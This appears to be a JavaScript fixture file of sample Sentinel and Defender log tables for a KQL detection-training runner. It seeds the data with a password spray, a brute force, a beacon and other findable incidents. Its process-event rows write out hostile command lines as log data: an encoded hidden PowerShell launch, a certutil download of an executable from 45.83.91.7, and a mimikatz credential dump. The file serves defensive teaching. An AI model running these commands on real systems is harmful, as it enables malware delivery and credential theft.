/**
 * Sample security tables, for the KQL runner.
 *
 * Shaped like the real Sentinel / Defender schemas — same column names,
 * same value conventions (ResultType '0' for success, '50126' for a bad
 * password) — so a query written here is a query that would run against
 * a real workspace. Learning against invented column names would teach
 * the wrong thing very convincingly.
 *
 * ── Built from offsets, not from literals ────────────────────────────
 * Every row carries `mAgo` — minutes before "now" — and the table is
 * materialised against a clock passed in. That is what makes
 * `where TimeGenerated > ago(24h)` behave the way it does in production
 * without the fixtures going stale the day after they were written.
 *
 * ── The data has answers in it ───────────────────────────────────────
 * These are not random rows. There is a password spray from 45.83.91.7,
 * one account that fails repeatedly and then succeeds from the same
 * address, a sign-in pair that is geographically impossible, and Office
 * applications spawning shells on two machines. Every runnable exercise
 * has a real, findable answer, and a nearly-right query gets a
 * different one — which is the only way a test tells you anything.
 */

/* ── SigninLogs ──────────────────────────────────────────────────────
 * mAgo, User, IP, ResultType, City, Country, App, Device
 * ResultType: '0' success · '50126' bad password · '50053' locked
 *             '50074' MFA not satisfied · '53003' blocked by policy
 */
const SIGNIN = [
  // A spray: one IP, many accounts, all failing. The dcount of accounts
  // is what separates this from someone forgetting their password.
  [40, 'j.okafor@contoso.com', '45.83.91.7', '50126', 'Sofia', 'BG', 'Office 365', 'unknown'],
  [39, 'a.whitfield@contoso.com', '45.83.91.7', '50126', 'Sofia', 'BG', 'Office 365', 'unknown'],
  [39, 'm.delgado@contoso.com', '45.83.91.7', '50126', 'Sofia', 'BG', 'Office 365', 'unknown'],
  [38, 'r.chen@contoso.com', '45.83.91.7', '50126', 'Sofia', 'BG', 'Office 365', 'unknown'],
  [38, 's.patel@contoso.com', '45.83.91.7', '50126', 'Sofia', 'BG', 'Office 365', 'unknown'],
  [37, 'h.mercer@contoso.com', '45.83.91.7', '50126', 'Sofia', 'BG', 'Office 365', 'unknown'],
  [37, 'l.novak@contoso.com', '45.83.91.7', '50126', 'Sofia', 'BG', 'Office 365', 'unknown'],
  [36, 'k.abara@contoso.com', '45.83.91.7', '50126', 'Sofia', 'BG', 'Office 365', 'unknown'],
  [36, 'd.forsyth@contoso.com', '45.83.91.7', '50126', 'Sofia', 'BG', 'Office 365', 'unknown'],
  [35, 'e.rossi@contoso.com', '45.83.91.7', '50126', 'Sofia', 'BG', 'Office 365', 'unknown'],
  [35, 'j.okafor@contoso.com', '45.83.91.7', '50126', 'Sofia', 'BG', 'Office 365', 'unknown'],
  [34, 'a.whitfield@contoso.com', '45.83.91.7', '50126', 'Sofia', 'BG', 'Office 365', 'unknown'],

  // A brute force against ONE account that lands. Same IP throughout.
  [180, 'p.harrington@contoso.com', '92.61.44.190', '50126', 'Lagos', 'NG', 'Azure Portal', 'unknown'],
  [178, 'p.harrington@contoso.com', '92.61.44.190', '50126', 'Lagos', 'NG', 'Azure Portal', 'unknown'],
  [176, 'p.harrington@contoso.com', '92.61.44.190', '50126', 'Lagos', 'NG', 'Azure Portal', 'unknown'],
  [174, 'p.harrington@contoso.com', '92.61.44.190', '50126', 'Lagos', 'NG', 'Azure Portal', 'unknown'],
  [172, 'p.harrington@contoso.com', '92.61.44.190', '50126', 'Lagos', 'NG', 'Azure Portal', 'unknown'],
  [170, 'p.harrington@contoso.com', '92.61.44.190', '50053', 'Lagos', 'NG', 'Azure Portal', 'unknown'],
  [150, 'p.harrington@contoso.com', '92.61.44.190', '0', 'Lagos', 'NG', 'Azure Portal', 'unknown'],

  // Impossible travel: London then Singapore forty minutes later.
  [300, 'c.udeh@contoso.com', '81.140.22.9', '0', 'London', 'GB', 'Office 365', 'WIN-CU-01'],
  [260, 'c.udeh@contoso.com', '203.116.8.44', '0', 'Singapore', 'SG', 'Office 365', 'unknown'],

  // Ordinary traffic — the noise a real query has to survive.
  [12, 'h.mercer@contoso.com', '81.140.22.9', '0', 'London', 'GB', 'Office 365', 'WIN-HM-04'],
  [22, 'h.mercer@contoso.com', '81.140.22.9', '0', 'London', 'GB', 'Teams', 'WIN-HM-04'],
  [44, 's.patel@contoso.com', '81.140.22.9', '0', 'London', 'GB', 'Office 365', 'WIN-SP-02'],
  [58, 's.patel@contoso.com', '81.140.22.9', '50126', 'London', 'GB', 'Office 365', 'WIN-SP-02'],
  [59, 's.patel@contoso.com', '81.140.22.9', '0', 'London', 'GB', 'Office 365', 'WIN-SP-02'],
  [90, 'r.chen@contoso.com', '86.11.203.4', '0', 'Manchester', 'GB', 'Azure Portal', 'WIN-RC-07'],
  [120, 'r.chen@contoso.com', '86.11.203.4', '50074', 'Manchester', 'GB', 'Azure Portal', 'WIN-RC-07'],
  [130, 'r.chen@contoso.com', '86.11.203.4', '0', 'Manchester', 'GB', 'Azure Portal', 'WIN-RC-07'],
  [200, 'e.rossi@contoso.com', '151.62.9.31', '0', 'Milan', 'IT', 'Office 365', 'MAC-ER-01'],
  [420, 'e.rossi@contoso.com', '151.62.9.31', '0', 'Milan', 'IT', 'Office 365', 'MAC-ER-01'],
  [500, 'm.delgado@contoso.com', '88.24.66.101', '0', 'Madrid', 'ES', 'Teams', 'WIN-MD-03'],
  [640, 'm.delgado@contoso.com', '88.24.66.101', '53003', 'Madrid', 'ES', 'Teams', 'WIN-MD-03'],
  [900, 'k.abara@contoso.com', '81.140.22.9', '0', 'London', 'GB', 'Office 365', 'WIN-KA-09'],
  [1100, 'l.novak@contoso.com', '81.140.22.9', '0', 'London', 'GB', 'Office 365', 'WIN-LN-05'],
  [1300, 'd.forsyth@contoso.com', '81.140.22.9', '0', 'London', 'GB', 'Teams', 'WIN-DF-06'],

  // Older than 24h — there so a missing time filter gives a different
  // answer. Without these the filter is untested decoration.
  [1500, 'svc-backup@contoso.com', '10.4.2.9', '0', 'London', 'GB', 'Azure Portal', 'SRV-BK-01'],
  [1700, 'j.okafor@contoso.com', '45.83.91.7', '50126', 'Sofia', 'BG', 'Office 365', 'unknown'],
  [1800, 'a.whitfield@contoso.com', '45.83.91.7', '50126', 'Sofia', 'BG', 'Office 365', 'unknown'],
  [2100, 'r.chen@contoso.com', '45.83.91.7', '50126', 'Sofia', 'BG', 'Office 365', 'unknown'],
  [2400, 's.patel@contoso.com', '45.83.91.7', '50126', 'Sofia', 'BG', 'Office 365', 'unknown'],
  [3000, 'h.mercer@contoso.com', '81.140.22.9', '0', 'London', 'GB', 'Office 365', 'WIN-HM-04'],
];

/* ── DeviceProcessEvents ────────────────────────────────────────────
 * mAgo, Device, Account, Parent, Process, CommandLine
 *
 * The Device* tables carry BOTH time column names, and that is not
 * sloppiness. Defender's advanced hunting calls it `Timestamp`;
 * the same table ingested into a Sentinel workspace carries
 * `TimeGenerated` as well. Queries written against either console are
 * real queries, and both should run here — silently matching nothing
 * because the query said Timestamp is exactly the class of quiet
 * wrongness this runner is supposed to avoid.
 *
 * Rows older than 24h are the BASELINE. "First seen in the last day"
 * is only a meaningful question if there is a history to be new
 * against, so the ordinary processes appear days back as well.
 */
const PROCESS = [
  // Office spawning shells — the classic execution signal.
  [25, 'WIN-HM-04', 'h.mercer', 'winword.exe', 'powershell.exe',
    'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0A'],
  [24, 'WIN-HM-04', 'h.mercer', 'powershell.exe', 'cmd.exe', 'cmd.exe /c whoami'],
  [110, 'WIN-SP-02', 's.patel', 'excel.exe', 'cmd.exe', 'cmd.exe /c certutil -urlcache -f http://45.83.91.7/a.exe a.exe'],
  [109, 'WIN-SP-02', 's.patel', 'cmd.exe', 'certutil.exe', 'certutil -urlcache -f http://45.83.91.7/a.exe a.exe'],
  [300, 'WIN-RC-07', 'r.chen', 'outlook.exe', 'powershell.exe', 'powershell.exe -File update.ps1'],

  // Normal developer and admin noise.
  [15, 'WIN-HM-04', 'h.mercer', 'explorer.exe', 'chrome.exe', 'chrome.exe --profile-directory=Default'],
  [30, 'WIN-HM-04', 'h.mercer', 'explorer.exe', 'teams.exe', 'teams.exe'],
  [45, 'WIN-SP-02', 's.patel', 'explorer.exe', 'code.exe', 'code.exe .'],
  [46, 'WIN-SP-02', 's.patel', 'code.exe', 'node.exe', 'node.exe server.js'],
  [47, 'WIN-SP-02', 's.patel', 'code.exe', 'git.exe', 'git.exe status'],
  [48, 'WIN-SP-02', 's.patel', 'code.exe', 'git.exe', 'git.exe push origin main'],
  [70, 'WIN-RC-07', 'r.chen', 'explorer.exe', 'chrome.exe', 'chrome.exe'],
  [95, 'WIN-RC-07', 'r.chen', 'explorer.exe', 'powershell.exe', 'powershell.exe -File Get-Mailbox.ps1'],
  [140, 'SRV-BK-01', 'svc-backup', 'services.exe', 'veeam.exe', 'veeam.exe --run nightly'],
  [141, 'SRV-BK-01', 'svc-backup', 'veeam.exe', 'cmd.exe', 'cmd.exe /c robocopy D:\\ E:\\ /MIR'],
  [400, 'WIN-MD-03', 'm.delgado', 'explorer.exe', 'chrome.exe', 'chrome.exe'],
  [420, 'WIN-MD-03', 'm.delgado', 'explorer.exe', 'excel.exe', 'excel.exe budget.xlsx'],
  [800, 'WIN-KA-09', 'k.abara', 'explorer.exe', 'outlook.exe', 'outlook.exe'],
  [1200, 'WIN-LN-05', 'l.novak', 'explorer.exe', 'chrome.exe', 'chrome.exe'],
  [1600, 'WIN-DF-06', 'd.forsyth', 'winword.exe', 'cmd.exe', 'cmd.exe /c ping 8.8.8.8'],

  // Credential dumping, spelled out — the needle for the has/contains
  // exercise, which has nothing to find without it.
  [55, 'WIN-RC-07', 'r.chen', 'cmd.exe', 'mimikatz.exe',
    'mimikatz.exe privilege::debug sekurlsa::logonpasswords exit'],
  // …and a near-miss that `contains` matches and `has` does not, which
  // is the whole point of that exercise.
  [56, 'WIN-RC-07', 'r.chen', 'cmd.exe', 'notepad.exe', 'notepad.exe C:\\tools\\notmimikatzhere.txt'],

  // ── Baseline: 2–20 days back, the estate behaving normally ──
  [2900, 'WIN-HM-04', 'h.mercer', 'explorer.exe', 'chrome.exe', 'chrome.exe'],
  [4400, 'WIN-HM-04', 'h.mercer', 'explorer.exe', 'teams.exe', 'teams.exe'],
  [5900, 'WIN-SP-02', 's.patel', 'explorer.exe', 'code.exe', 'code.exe .'],
  [7300, 'WIN-SP-02', 's.patel', 'code.exe', 'node.exe', 'node.exe server.js'],
  [8800, 'WIN-SP-02', 's.patel', 'code.exe', 'git.exe', 'git.exe status'],
  [10200, 'WIN-RC-07', 'r.chen', 'explorer.exe', 'chrome.exe', 'chrome.exe'],
  [11700, 'WIN-RC-07', 'r.chen', 'explorer.exe', 'powershell.exe', 'powershell.exe -File Get-Mailbox.ps1'],
  [13100, 'SRV-BK-01', 'svc-backup', 'services.exe', 'veeam.exe', 'veeam.exe --run nightly'],
  [14600, 'SRV-BK-01', 'svc-backup', 'veeam.exe', 'cmd.exe', 'cmd.exe /c robocopy D:\\ E:\\ /MIR'],
  [16000, 'WIN-MD-03', 'm.delgado', 'explorer.exe', 'chrome.exe', 'chrome.exe'],
  [17500, 'WIN-MD-03', 'm.delgado', 'explorer.exe', 'excel.exe', 'excel.exe budget.xlsx'],
  [18900, 'WIN-KA-09', 'k.abara', 'explorer.exe', 'outlook.exe', 'outlook.exe'],
  [20400, 'WIN-LN-05', 'l.novak', 'explorer.exe', 'chrome.exe', 'chrome.exe'],
  [21800, 'WIN-DF-06', 'd.forsyth', 'explorer.exe', 'chrome.exe', 'chrome.exe'],
  [23300, 'WIN-HM-04', 'h.mercer', 'explorer.exe', 'chrome.exe', 'chrome.exe'],
  [25000, 'WIN-RC-07', 'r.chen', 'explorer.exe', 'chrome.exe', 'chrome.exe'],
];

/* ── DeviceNetworkEvents ────────────────────────────────────────────
 * mAgo, Device, Process, RemoteIP, RemoteUrl, RemotePort
 *
 * The beaconing story lives here: WIN-HM-04 calls out to the same
 * address every five minutes, dead regular, which is what separates
 * an implant's check-in from a person browsing.
 */
const NETWORK = [
  // The beacon: 20 check-ins, exactly five minutes apart. Twenty
  // because the reference query wants more than twelve intervals, and
  // exactly five minutes because a near-zero spread over a steady mean
  // is what makes it machine rather than human.
  ...Array.from({ length: 20 }, (_, n) => [
    20 + n * 5, 'WIN-HM-04', 'powershell.exe', '45.83.91.7', 'cdn.updates-cache.net', 443, 'ConnectionSuccess',
  ]),
  [30, 'WIN-SP-02', 'certutil.exe', '45.83.91.7', 'cdn.updates-cache.net', 80, 'ConnectionSuccess'],
  // Human browsing: same device, irregular gaps. The contrast is the
  // exercise — a query that just counts connections flags this too.
  [18, 'WIN-HM-04', 'chrome.exe', '142.250.187.196', 'www.google.com', 443, 'ConnectionSuccess'],
  [19, 'WIN-HM-04', 'chrome.exe', '104.18.32.7', 'news.ycombinator.com', 443, 'ConnectionSuccess'],
  [23, 'WIN-HM-04', 'chrome.exe', '104.18.32.7', 'news.ycombinator.com', 443, 'ConnectionSuccess'],
  [41, 'WIN-HM-04', 'chrome.exe', '104.18.32.7', 'news.ycombinator.com', 443, 'ConnectionSuccess'],
  [42, 'WIN-HM-04', 'chrome.exe', '104.18.32.7', 'news.ycombinator.com', 443, 'ConnectionSuccess'],
  [77, 'WIN-HM-04', 'chrome.exe', '104.18.32.7', 'news.ycombinator.com', 443, 'ConnectionSuccess'],
  [26, 'WIN-SP-02', 'code.exe', '140.82.121.4', 'github.com', 443, 'ConnectionSuccess'],
  [27, 'WIN-SP-02', 'code.exe', '140.82.121.4', 'api.github.com', 443, 'ConnectionSuccess'],
  [61, 'WIN-RC-07', 'chrome.exe', '13.107.42.14', 'www.linkedin.com', 443, 'ConnectionSuccess'],
  [88, 'WIN-RC-07', 'outlook.exe', '52.96.88.34', 'outlook.office365.com', 443, 'ConnectionSuccess'],
  [90, 'WIN-RC-07', 'putty.exe', '203.0.113.44', '', 22, 'ConnectionSuccess'],
  [91, 'WIN-SP-02', 'mstsc.exe', '10.4.2.71', '', 3389, 'ConnectionSuccess'],
  [92, 'WIN-SP-02', 'outlook.exe', '52.96.88.34', 'smtp.office365.com', 587, 'ConnectionSuccess'],
  [140, 'SRV-BK-01', 'veeam.exe', '10.4.2.60', 'backup.internal', 9392, 'ConnectionSuccess'],
  [400, 'WIN-MD-03', 'chrome.exe', '151.101.1.140', 'www.bbc.co.uk', 443, 'ConnectionSuccess'],
  [401, 'WIN-MD-03', 'chrome.exe', '151.101.1.140', 'www.bbc.co.uk', 443, 'ConnectionFailed'],
  [1600, 'WIN-DF-06', 'cmd.exe', '8.8.8.8', '', 53, 'ConnectionSuccess'],
];

/* ── SecurityAlert ──────────────────────────────────────────────────
 * mAgo, AlertName, Severity, Entity, ProviderName
 */
const ALERTS = [
  [34, 'Password spray against multiple accounts', 'High', '45.83.91.7', 'Azure AD Identity Protection'],
  [149, 'Suspicious sign-in after repeated failures', 'High', 'p.harrington@contoso.com', 'Azure AD Identity Protection'],
  [259, 'Atypical travel', 'Medium', 'c.udeh@contoso.com', 'Azure AD Identity Protection'],
  [24, 'Office application launched a command shell', 'Medium', 'WIN-HM-04', 'Microsoft Defender for Endpoint'],
  [108, 'Suspicious download via certutil', 'High', 'WIN-SP-02', 'Microsoft Defender for Endpoint'],
  [22, 'Possible command-and-control beacon', 'High', 'WIN-HM-04', 'Microsoft Defender for Endpoint'],
  [299, 'Unusual PowerShell activity', 'Low', 'WIN-RC-07', 'Microsoft Defender for Endpoint'],
  [1580, 'Anonymous IP address sign-in', 'Low', 'd.forsyth@contoso.com', 'Azure AD Identity Protection'],
];

/**
 * Materialise both tables against a clock.
 *
 * @param now Date — every TimeGenerated is computed back from this
 * @returns {{SigninLogs: object[], DeviceProcessEvents: object[]}}
 */
export function buildTables(now = new Date()) {
  const at = m => new Date(now.getTime() - m * 60000);
  return {
    SigninLogs: SIGNIN.map(([mAgo, user, ip, result, city, country, app, device]) => ({
      TimeGenerated: at(mAgo),
      UserPrincipalName: user,
      IPAddress: ip,
      ResultType: result,
      // Nested, exactly as the real table has it — so the dotted access
      // in `tostring(LocationDetails.countryOrRegion)` is practised here
      // and not discovered in production.
      LocationDetails: { city, countryOrRegion: country },
      AppDisplayName: app,
      DeviceDetail: { displayName: device },
    })),
    DeviceProcessEvents: PROCESS.map(([mAgo, device, account, parent, process, cmd]) => ({
      Timestamp: at(mAgo),
      TimeGenerated: at(mAgo),
      DeviceName: device,
      AccountName: account,
      InitiatingProcessFileName: parent,
      FileName: process,
      ProcessCommandLine: cmd,
    })),
    DeviceNetworkEvents: NETWORK.map(([mAgo, device, process, ip, url, port, action]) => ({
      Timestamp: at(mAgo),
      TimeGenerated: at(mAgo),
      DeviceName: device,
      InitiatingProcessFileName: process,
      RemoteIP: ip,
      RemoteUrl: url,
      RemotePort: port,
      ActionType: action,
    })),
    SecurityAlert: ALERTS.map(([mAgo, name, severity, entity, provider]) => ({
      TimeGenerated: at(mAgo),
      AlertName: name,
      AlertSeverity: severity,
      CompromisedEntity: entity,
      ProviderName: provider,
    })),
  };
}

/** Column list per table, for the schema panel beside the editor. */
export const TABLE_SCHEMA = {
  SigninLogs: [
    ['TimeGenerated', 'datetime'],
    ['UserPrincipalName', 'string'],
    ['IPAddress', 'string'],
    ['ResultType', 'string — "0" is success'],
    ['LocationDetails', 'dynamic — .city, .countryOrRegion'],
    ['AppDisplayName', 'string'],
    ['DeviceDetail', 'dynamic — .displayName'],
  ],
  DeviceProcessEvents: [
    ['Timestamp', 'datetime — Defender\u2019s name'],
    ['TimeGenerated', 'datetime — the Sentinel copy, same value'],
    ['DeviceName', 'string'],
    ['AccountName', 'string'],
    ['InitiatingProcessFileName', 'string — the parent'],
    ['FileName', 'string — the process started'],
    ['ProcessCommandLine', 'string'],
  ],
  DeviceNetworkEvents: [
    ['Timestamp', 'datetime — Defender\u2019s name'],
    ['TimeGenerated', 'datetime — the Sentinel copy, same value'],
    ['DeviceName', 'string'],
    ['InitiatingProcessFileName', 'string'],
    ['RemoteIP', 'string'],
    ['RemoteUrl', 'string'],
    ['RemotePort', 'int'],
    ['ActionType', 'string — ConnectionSuccess / ConnectionFailed'],
  ],
  SecurityAlert: [
    ['TimeGenerated', 'datetime'],
    ['AlertName', 'string'],
    ['AlertSeverity', 'string — High / Medium / Low'],
    ['CompromisedEntity', 'string — an account or a device'],
    ['ProviderName', 'string'],
  ],
};

/** Result codes, so an exercise can be read without looking them up. */
export const RESULT_TYPES = [
  ['0', 'Success'],
  ['50126', 'Wrong username or password'],
  ['50053', 'Account locked — too many attempts'],
  ['50074', 'MFA not satisfied'],
  ['53003', 'Blocked by conditional access'],
];
